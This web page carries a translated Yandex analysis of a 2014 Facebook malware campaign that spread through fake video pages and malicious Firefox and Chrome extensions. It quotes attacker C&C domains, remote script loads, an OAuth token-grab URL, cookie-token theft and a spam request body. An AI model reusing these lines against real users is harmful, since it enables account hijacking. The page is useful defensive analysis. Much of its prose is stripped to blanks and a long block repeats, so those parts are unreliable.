<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Yandex investigation: full disclosure about the virus on Facebook</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In the middle of December, in the Russian segment of Facebook, it was possible to observe a massive infection of users with a virus, which was spread ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Yandex investigation: full disclosure about the virus on Facebook</h1><div class="post__text post__text-html js-mediator-article">  In the middle of December, in the Russian segment of Facebook, it was possible to observe a massive infection of users with a virus, which was spread through spam mailings of personal messages and publications with links to allegedly private video. <br><br>  According <a href="http://top.rbc.ru/technology_and_media/16/12/2014/54903a742ae596fb3cd189bb">to media reports</a> , Facebook coped with the threat and blocked the spread of malicious messages.  However, we later discovered the further spread of a number of malicious links and decided to understand how this attack works in order to protect Yandex.Browser users from it. <br><br>  The media reported that the culprit was the malicious YouTurn extension for the Chrome browser, which the user was asked to install if he followed the link received from his infected friend.  But we found out that several extensions were used within this infection.  YouTurn, by the way, December 16 has already been removed from ChromeStore. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/files/d69/d4e/59a/d69d4e59a680429f85cc5034e7ee57f8.png" alt="image"><br><br>  They were all the same, but they were distributed under different names and at different times through phishing resources similar to the Facebook page and hosted on Amazon S3.  Interestingly, in addition to the distribution mechanisms, they loaded advertising banners with dubious content into all browser tabs and provided access to the account of an infected user to an internal application with some ID, which Facebook also blocked. <br><br>  So, was this ‚Äúvirus‚Äù so harmless, and what was new about it? <br><a name="habracut"></a><br><h3>  Analysis of the spread of malware </h3><br>  In all cases, the malicious link was generated using various abbreviation services. When switching to it, the user was sent along a chain of server redirects, for example: <br><br> <code><a href="http://goo.gl/rlzp52"></a> <a href="https://dl.dropbox.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm%3F445694741%3FMYBn8KdpVhlnHNc0drEE"></a> <a href="https://dl.dropboxusercontent.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm%3F445694741%253FMYBn8KdpVhlnHNc0drEE%3D"></a> goo.gl/rlzp52 -&gt; dl.dropbox.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm?445694741?MYBn8KdpVhlnHNc0drEE -&gt; dl.dropboxusercontent.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm?445694741%3FMYBn8KdpVhlnHNc0drEE=</code>  <code><a href="http://goo.gl/rlzp52"></a> <a href="https://dl.dropbox.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm%3F445694741%3FMYBn8KdpVhlnHNc0drEE"></a> <a href="https://dl.dropboxusercontent.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm%3F445694741%253FMYBn8KdpVhlnHNc0drEE%3D"></a> goo.gl/rlzp52 -&gt; dl.dropbox.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm?445694741?MYBn8KdpVhlnHNc0drEE -&gt; dl.dropboxusercontent.com/s/xw7h4fc427avpp5/rwqhebhjwqbehjqwhje_3_2_4.htm?445694741%3FMYBn8KdpVhlnHNc0drEE=</code> , <br><br>  The end point was a webpage at dropboxusercontent.com.  It contained very simple js scripts, the main function of which was to check the browser object ‚Äúnavigator‚Äù and execute the redirect depending on its value.  Mobile users and IE users were redirected to the <a href="http://teladea.blogspot.com/">teladea.blogspot.com</a> web page, which contained a video with a parody of the film ‚ÄúFriday, the 13th,‚Äù and a link to <a href="https://www.icrc.org/">the Red Cross website</a> . <br><br><img src="https://habrastorage.org/files/b85/c07/bf5/b85c07bf51d24bb090a0c7c871da6c28.png"><br><br>  Firefox users redirect scripts by reference <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/mf39.html"></a> video51828.s3-website-us-west-2.amazonaws.com/mf39.html</code>  <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/mf39.html"></a> video51828.s3-website-us-west-2.amazonaws.com/mf39.html</code> , and those following a link in Chrome were taken to <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/jqnwrjkq/index.html"></a> video51828.s3-website-us-west-2.amazonaws.com/jqnwrjkq/index.html</code>  <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/jqnwrjkq/index.html"></a> video51828.s3-website-us-west-2.amazonaws.com/jqnwrjkq/index.html</code> , so the user with the substring ‚ÄúFacebook-bot‚Äù in the navigator was redirected to Google. <br><br><img src="https://habrastorage.org/files/6a8/586/d0e/6a8586d0ee1a43099c9574c7b6e057e8.png"><br>  <i>Landing-page code</i> <br><br>  Web page for Firefox users ( <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/mf49.html"></a> video51828.s3-website-us-west-2.amazonaws.com/mf49.html</code>  <code><a href="http://video51828.s3-website-us-west-2.amazonaws.com/mf49.html"></a> video51828.s3-website-us-west-2.amazonaws.com/mf49.html</code> ) was disguised as YouTube (web content was generated mainly via js).  If a user came to this page from a mobile device based on the Android platform, a redirect was made to the s.html web page, which at the time of the analysis was no longer available.  If the browser was a desktop, the page instead of the video showed a message that you need to update FlashPlayer to view.  The full code can be seen <a href="http://pastebin.com/BFrYTxZx">here</a> . <br><br><img src="https://habrastorage.org/files/43b/7a9/317/43b7a9317d984fe08e5b4552e3cf1a1d.png"><br><br>  When you clicked on the "update Player" button, the browser extension ‚ÄúPremiumCodec‚Äù was installed in the Firefox browser, which was downloaded via the link <code><a href=""></a> premiumd1.mzzhost.com/premiumD.xpi</code>  <code><a href=""></a> premiumd1.mzzhost.com/premiumD.xpi</code> .  Interestingly, Firefox requires an additional permission to install the extension, but the attackers took this moment into account and, using the js-code, after pressing the update to the player, they formed an additional image showing the pointer with which to click to allow the installation. <br><br><img src="https://habrastorage.org/files/77e/bb3/a40/77ebb3a40cba43c2b5778ced895206e0.PNG"><br><br>  Directly installing the extension was carried out when executing the code: <br><br> <code><a href=""></a> top["location"] = premiumd1.mzzhost.com/premiumD.xpi. <br></code> <br><br>  Obfuscated js-script, which was located directly on the page, was responsible for this functionality. <br><br><img src="https://habrastorage.org/files/82e/35e/324/82e35e3240c74a96b30a710026c94e5b.png"><br>  <i>Fragment of deobfuscated extension installation code in FireFox</i> <br><br>  Expansion analysis is presented below in the relevant section of the post. <br><br>  The webpage for Chrome users (http://video51828.s3-website-us-west-2.amazonaws.com/jqnwrjkq/index.html) was also phishing and tried to impersonate Facebook.  Its contents are also generated using javascript. <br><br><img src="https://habrastorage.org/files/d69/d4e/59a/d69d4e59a680429f85cc5034e7ee57f8.png"><br><br>  The full page code can be found <a href="http://pastebin.com/Z6fcGbn0">here</a> . <br><br>  When clicking on the area with the video, the user was informed that he did not find the player, and was asked to put a special browser extension to compensate for this annoying flaw.  In our case, it was the YouTube Now extension (id akmghomonnhljmlfemmifjblglkacfhg), which was installed from the Chrome Web Store using the js mechanism chrome.webstore.install. <br><br><img src="https://habrastorage.org/files/ce4/ea4/274/ce4ea4274d76408a8a2673ca5ad7742e.png"><br>  <i>Fragment of deobfuscated extension installation script</i> <br><br><img src="https://habrastorage.org/files/892/0f9/423/8920f94237a14e03b24d7576c6f95cbf.png"><br>  <i>App page in the Chrome Web Store</i> <br><br>  The source for the extension was the same website address on Amazon S3 from which it was distributed. <br><br><h3>  Firefox extension analysis </h3><br>  The extension consisted of a number of files, it was built on the basis of the Crossbrowser.com platform, but had very simple functionality.  It inserted a script into all open browser tabs. <code><a href=""></a> adeaditi.info/kmain.js</code>  <code><a href=""></a> adeaditi.info/kmain.js</code> by adding a new tag <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> <br>  ,    ,   C&amp;C ,     , , adeaditi.info <br>  cracks4free.info. <br> <br>         : <br> <br> <a href="https://support.mozilla.org/ru/questions/959873">support.mozilla.org/ru/questions/959873</a> <br> <a href="http://stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing">stackoverflow.com/questions/17982902/prevent-malware-javascript-from-executing</a> <br> <br> ,            .          ,  ,     ,   2011 . <br> <br>     ,          - .      Facebook          .      ,               . <br> <br>           SBAPI  DNS,       .            ,    ,        ,      .   ,  CSP  ,  ,   img-src  object-src,  ,  ,           ,        .</code> <h3> <code><code><a href=""></a>  head .  kmain.js   -  ,      .      Facebook   ,  ,     adeaditi.info/kmain.js</code>       - .   ,    Firefox   Facebook-         . <br> <br> <img src="https://habrastorage.org/files/7ef/59f/f96/7ef59ff96d4e4707bb26f8f17e74b30b.png"> <br> <i>   PremiumCodec</i> <br> <br> <img src="https://habrastorage.org/files/744/13b/341/74413b3415754639b697abd7d4ac1587.png"> <br> <i>  <code><a href=""></a> adeaditi.info/kmain.js</code></i> <br> <br>    Chrome <br>         : icon128.png, manifest.json  main.js.     ,             YouTube,      "contextMenus"   permissions.  ,        : <br> <br> <code><a href=""></a> "content_security_policy": "script-src 'self' 'unsafe-eval' bmw5done.info; object-src 'self' 'unsafe-eval'"</code> , <br> <br>    ,     CSP    https       bmw5done.info. <br> <br>      main.js <br> <br> <img src="https://habrastorage.org/files/a61/53c/b85/a6153cb858714faa879b9159ed8f0722.png"> <br> <i>    main.js</i> <br> <br>  ,        document.write(‚Äúhttps://bmw5done.info/indonesia/ld.js‚Äù) . <br> <br>         ld.js,      <a href="http://pastebin.com/JB4kcaRk"></a> .      box,   ajax- : <br> <br> <code><a href=""></a> bmw5done.info/qbrweq.js?187630.24409614317</code> <br> <br>     json,          uri,      cmd.       json      ,  ,  cmd      . ,              . <br> <br>  ld.js    localStorage   ran_before, ,    ,      1,       facebook.com. <br> <br> <img src="https://habrastorage.org/files/c2d/c2b/a25/c2dc2ba25de04865a254ceae5854fd7d.png"> <br> <i>  ld.js</i> <br> <br>     callback-    .    ,     url    ‚Äúdevtools://‚Äù,   ,     ajax-   <code><a href=""></a> bmw5done.info/qbrweq.js?</code> ,             chrome.tabs.executeScript.  callback  ,    URL  : ‚Äúchrome://chrome/extensions‚Äù , ‚Äúopera://extensions‚Äù, ‚Äúchrome://extensions/‚Äù. <br> <br>        qbrweq.js?    ,     Facebook-,      <a href="http://pastebin.com/9jeC5sVi"></a> . <br> <br>   ,        URL ‚Äúwww.facebook.com‚Äù,   ,     .   ,       <code>uiToggle wrap, uiPopover. _5ce</code> .    ,   . ,            ,    Facebook  . <br> <br> <img src="https://habrastorage.org/files/214/a11/489/214a1148916843a2aaf214ced1ec78be.png"> <br> <i>  qbrweq.js,    </i> <br> <br>    ajax-    facebook.com,      document.cookie  ,     ANTI-CSRF- ‚Äúfb_dtsg‚Äù  uid .      ,    . <br> <br> <img src="https://habrastorage.org/files/3f6/248/da0/3f6248da017d4fc392ffa68e36708d90.png"> <br> <br>     URL <code><a href="https://bmw5done.info/apostime.php"></a> bmw5done.info/apostime.php</code> ‚Äî  php-   C&amp;C  .        ,    ,     json,       : link  type.  : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "type": "aktiv" }.</code> <br>     link,      ¬´?¬ª,      20   ,        ajax-     <code><a href="https://www.googleapis.com/urlshortener/v1/url"></a> www.googleapis.com/urlshortener/v1/url</code> .     localStorage   ‚Äúfb_postlink‚Äù.           . <br> <br>      ajax-api graph.facebook.com       .    <code><a href="https://facebook.com/ajax/typeahead/place_tag_friends.php"></a> facebook.com/ajax/typeahead/place_tag_friends.php</code>  json      .  json ,        friends_fields,      20  : <br> <br> <code>‚Äú&amp;composertags_with[19]=&lt;id_  &gt;"</code> . <br> <br> <img src="https://habrastorage.org/files/341/12b/bbd/34112bbbd66646cc9e550d28a8fe5711.png"> <br> <i>              20</i> <br> <br>      veri,          friends_fields. <br> <br>    ,     msjrandom.   json,   C&amp;C,   'aktiv'   1,   post_add().          ‚Äú  ‚Äù + ‚ÄúPrivate Video‚Äù     msjrandom,      "fb_postlink".  ,       (      veri).     . <br> <br>   ,      Like,       ,        . , ,       . <br> <br>      : <br> <br> <code>uygulamaizinver(TokenUrl("517220311745087"));</code> <br> <br>   ,            Facebook-  Facebook-  id 517220311745087.  TokenUrl()   url -: <br> <br> <code><a href="https://www.facebook.com/dialog/oauth%3Fresponse_type%3Dtoken%26display%3Dpopup%26client_id%3D517220311745087%26redirect_uri%3Dfbconnect"></a> www.facebook.com/dialog/oauth?response_type=token&amp;display=popup&amp;client_id=517220311745087&amp;redirect_uri=fbconnect://success&amp;sso_key=com&amp;scope=email,publish_stream,user_likes,friends_likes,user_birthday</code> <br> <br> <img src="https://habrastorage.org/files/0c2/a59/741/0c2a5974183d49d4890fe2571d9396cc.png"> <br> <br>  <code>uygulamaizinver()</code>   ajax-,       html,    ,     action  .       <code>duzenlevegonder()</code> ,            ,       ,  <code>duzenlevegonder()</code>  . <br> <br> <img src="https://habrastorage.org/files/08d/6d9/823/08d6d982394a45fb8cb3c528e0396b82.png"> <br> <br>       Facebook       ,    ,        .        .       . <br> <br>      ,     facebook.com,       ,     <code>babasker()</code> ,      <code><a href="https://bmw5done.info/ag.php"></a> bmw5done.info/ag.php</code> .    php-,     C&amp;C,   ,       API     Facebook.    json : <br> <br> <code>{ "link": "https://dl.dropbox.com/s/o2yzr7kfewaqc1o/sa7d89as987d78a9d89s_2_2_2.htm?1241705463", "base": "facebook.com", "okan": , "foto1": "https://graph.facebook.com/", "foto2": "/picture?type=large&amp;width=150&amp;height=150", "titulli": , "friends": "jo", "friendname": "jo", "type": "aktiv","web": "po" }</code> <br> <br>      ‚Äútype‚Äù   aktiv,   ajax-   <a href="https://www.googleapis.com/urlshortener/v1/">www.googleapis.com/urlshortener/v1</a>  ,    ,     C&amp;C   ‚Äúlink‚Äù,      localStorage     "fb_postlink", ,     .     <code>qwecek()</code> ,         C&amp;C json. <br> <br>    AJAX-API Facebook <a href="https://facebook.com/ajax/chat/buddy_list.php%3F__a%3D1">facebook.com/ajax/chat/buddy_list.php?__a=1</a> <br>   id ,     Facebook-,   configList.     20     id     .   c          json    <code>benimesaj()</code> ,       : <br> <br> <code>message_batch[0][action_type]=ma-type%3Auser-generated-message&amp;message_batch[0][author]=fbid%3A&lt;id__&gt;&amp;message_batch[0][author_email]&amp;message_batch[0][coordinates]&amp;message_batch[0][timestamp_time_passed]=0&amp;message_batch[0][is_unread]=false&amp;message_batch[0][is_cleared]=false&amp;message_batch[0][is_forward]=false&amp;message_batch[0][is_filtered_content]=false&amp;message_batch[0][is_spoof_warning]=false&amp;message_batch[0][source]=source%3Achat%3Aweb&amp;message_batch[0][source_tags][0]=source%3Achat&amp;message_batch[0][body]= &amp;message_batch[0][has_attachment]=true&amp;message_batch[0][html_body]=false&amp;&amp;message_batch[0][specific_to_list][0]=fbid%3A&lt;id__online&gt;&amp;message_batch[0][specific_to_list][1]=fbid%3A&lt;id__&gt;&amp;message_batch[0][content_attachment][subject]=IP6%20Short%20URL%20-%20Free%20service&amp;message_batch[0][content_attachment][app_id]=2309869772&amp;message_batch[0][content_attachment][attachment][params][urlInfo][canonical]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][final]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][urlInfo][user]=&lt;fb_post_link&gt;&amp;message_batch[0][content_attachment][attachment][params][favicon]=&amp;message_batch[0][content_attachment][attachment][params][title]=&lt;__online&gt;jo&amp;message_batch[0][content_attachment][attachment][params][summary]=youtube.com&amp;message_batch[0][content_attachment][attachment][params][images][0]=https://graph.facebook.com/&lt;id__online&gt;/picture?type=large&amp;width=150&amp;height=150&amp;message_batch[0][content_attachment][attachm...k_ <br> metrics][images_pending]=0&amp;message_batch[0][content_attachment][link_metrics][images_fetched]=0&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][0]=626&amp;message_batch[0][content_attachment][link_metrics][image_dimensions][1]=293&amp;message_batch[0][content_attachment][link_metrics][images_selected]=1&amp;message_batch[0][content_attachment][link_metrics][images_considered]=1&amp;message_batch[0][content_attachment][link_metrics][images_cap]=3&amp;message_batch[0][content_attachment][link_metrics][images_type]=ranked&amp;message_batch[0][content_attachment][composer_metrics][best_image_w]=100&amp;message_batch[0][content_attachment][composer_metrics][best_image_h]=100&amp;message_batch[0][content_attachment][composer_metrics][image_selected]=0&amp;message_batch[0][content_attachment][composer_metrics][images_provided]=1&amp;message_batch[0][content_attachment][composer_metrics][images_loaded]=1&amp;message_batch[0][content_attachment][composer_metrics][images_shown]=1&amp;message_batch[0][content_attachment][composer_metrics][load_duration]=4&amp;message_batch[0][content_attachment][composer_metrics][timed_out]=0&amp;message_batch[0][content_attachment][composer_metrics][sort_order]=&amp;message_batch[0][content_attachment][composer_metrics][selector_type]=UIThumbPager_6&amp;message_batch[0][ui_push_phase]=V3&amp;message_batch[0][status]=0&amp;client=mercury&amp;__user=AAA&amp;__a=1&amp;__dyn=7n8anEAMCBynzpQ9UoGya4Cq74qbx2mbAKGiyGGEZ9LFDxCm6p_AyoSnx2&amp;__req=f&amp;fb_dtsg=100004008835111&amp;ttstamp=2658172571218810680459011989&amp;__rev=1300533</code> . <br> <br>    API <a href="https://facebook.com/">facebook.com</a> /ajax/mercury/send_messages.php?__a=1        ,     ,        . <br> <br> <img src="https://habrastorage.org/files/93e/683/f1f/93e683f1f6f84abb818f02c51f85869f.png"> <br> <i>   id      </i> <br> <br>    localStorage   okanxxxxss2     + 11e4,      <code>babasker()</code>   . <br> <br>  ,              Firefox.         ,          . <br> <br> <img src="https://habrastorage.org/files/1d0/e4c/734/1d0e4c7345764b4d9427d81e55c9da38.png"> <br> <br> ,            chrome.tabs.executeScript      CSP-,     //superfish.com, //ads.panoramtech.net  <a href="http://srv1.clk-analytics.com/">srv1.clk-analytics.com</a>      head  ,   CSP   .       ,        ,   CSP facebook.com.       ,         .       img-src  object-src,   facebook.com   CSP  . <br> <br>  <br>    Chrome,  ,             -  : <br> <br>          .                    ;            - ,    . <br> <br>         ,        , ..         ,     ,      -        . ,  ,    ,   ,   -   . <br> 